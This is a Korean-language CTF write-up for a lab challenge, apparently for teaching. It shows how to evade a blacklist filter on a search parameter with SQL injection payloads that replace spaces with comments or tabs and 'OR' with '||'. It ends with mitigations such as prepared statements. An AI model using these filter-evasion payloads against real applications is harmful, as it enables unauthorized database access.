+++
title = "VulnABLE CTF [LUXORA]: SQL Injection 🥈 Silver (Filter Evasion)"
description = "LUXORA 플랫폼의 SQL Injection Silver 난이도 플래그 획득 시나리오 및 공백/문자 필터링 우회 기법"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Silver", "Bypass"]
+++

# VulnABLE CTF [LUXORA]: SQL Injection 🥈 Silver

이전 단계(Bronze)에서는 아무런 필터링이 없는 원초적인 SQL Injection을 수행했습니다. 하지만 Silver 난이도인 `/sqli/silver` 라우트에서는 개발자가 나름대로의 방어벽(Filter)을 세워두었습니다. 이 방어벽을 어떻게 분석하고 우회하는지 알아보겠습니다.

---

## 🕒 1. 타겟 탐색 및 필터링 확인 (Reconnaissance)

`/sqli/silver?search=admin` 에 접속해보면, 사용자의 이름을 검색하는 기능이 동작합니다.

**[첫 번째 시도: Bronze 페이로드 재사용]**
```http
GET /sqli/silver?search=admin' OR '1'='1
```

**[결과]**
```text
[Blocked] Malicious input detected! No spaces or 'OR' keyword allowed.
```

**[해커의 사고 과정]**
* 개발자가 입력값에 **공백 문자(Space)**와 특정 키워드(**OR**)가 들어오면 차단하도록 WAF(Web Application Firewall) 룰이나 정규식을 설정해두었구나!
* 그렇다면 공백을 쓰지 않고, `OR` 대신 다른 논리 연산자를 사용해야 한다.

---

## 🕒 2. 필터링 우회 전략 (Bypass Techniques)

방어 로직을 우회하기 위해 두 가지 기술을 결합해야 합니다.

1. **공백(Space) 우회**: 
   - SQL에서 띄어쓰기를 대체할 수 있는 문자는 다양합니다. 
   - 탭(`%09`), 개행(`%0A`), 주석(`/**/`), 혹은 괄호(`()`)를 이용해 공백 없이 명령어를 이어 붙일 수 있습니다.
2. **`OR` 키워드 우회**:
   - 논리 연산자 `OR` 기호 대신 파이프 두 개 `||` 를 사용하면 동일한 논리 연산(참/거짓)이 수행됩니다. (데이터베이스 종류에 따라 다를 수 있으나 MySQL/MariaDB 등에서 통용됨)

---

## 🕒 3. 공격 수행 및 PoC (Exploitation)

이제 우회 전략을 적용하여 새로운 페이로드를 작성합니다.

* 목표 로직: `admin' OR 1=1 --`
* 공백을 `/**/`로 치환: `admin'/**/OR/**/1=1/**/--` (하지만 OR가 막혀있음)
* OR를 `||`로 치환: `admin'/**/||/**/1=1/**/--`

### 🚀 페이로드 전송
URL 인코딩을 적용하여 전송합니다.

```http
GET /sqli/silver?search=admin'/**/||/**/1=1/**/--
```

*(참고: `--` 뒤에는 반드시 공백이나 다른 문자가 있어야 주석으로 인식하는 경우가 많으므로 `-- -` 형태로 많이 사용합니다. 여기서는 괄호를 쓴 또 다른 우회법을 소개합니다.)*

**[더 우아한 괄호 우회법]**
공백이나 주석조차 쓰기 귀찮다면 괄호를 묶어버리면 됩니다.
```http
GET /sqli/silver?search=admin'||(1=1)#
```

### 🔍 공격 결과
필터링 로직이 공백 문자와 대문자 `OR`만 검사했기 때문에, 우리의 기호 기반 페이로드(`||`, `()`)는 필터를 무사히 통과합니다!

```text
Search Results:
1. admin (admin@luxora.test)
2. testuser (test@luxora.test)
...
[!] CONGRATULATIONS! FLAG: FLAG{SQLI_🥈_BYPASS_F92C4A}
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{SQLI_🥈_BYPASS_F92C4A}`

### 📝 왜 이런 공격이 성공했는가?
개발자가 **블랙리스트(Blacklist)** 방식의 방어를 취했기 때문입니다. "이것만 막으면 되겠지?" 하고 `OR`, `AND`, `공백` 몇 개만 막아두었지만, 해커는 그 외의 수많은 대체 문자(`||`, `&&`, `%0a`, `/**/`)를 알고 있습니다. 블랙리스트는 언제나 우회당할 구멍이 존재합니다.

### 🛡️ 방어 대책 (Mitigation)
블랙리스트 방식은 필패합니다. 따라서 반드시 다음과 같은 조치를 취해야 합니다:
1. **Prepared Statements (파라미터화된 쿼리)**: 1단계와 마찬가지로 쿼리 구조와 데이터를 원천 분리하는 것이 유일하고 완벽한 해결책입니다.
2. **화이트리스트(Whitelist) 검증**: 만약 정렬 기준(ORDER BY)처럼 파라미터 바인딩이 불가능한 곳이라면, 허용된 단어(`name`, `date` 등)만 들어올 수 있도록 화이트리스트로 엄격히 통제해야 합니다.
3. **ORM / Query Builder 사용**: Prisma, TypeORM, Hibernate 같은 현대적인 프레임워크를 사용하면 내부적으로 안전한 쿼리를 생성해 줍니다.

다음은 데이터를 눈으로 볼 수 없는 환경에서 진행하는 **Gold 🥇 (Blind SQL Injection)** 기법을 다루어보겠습니다!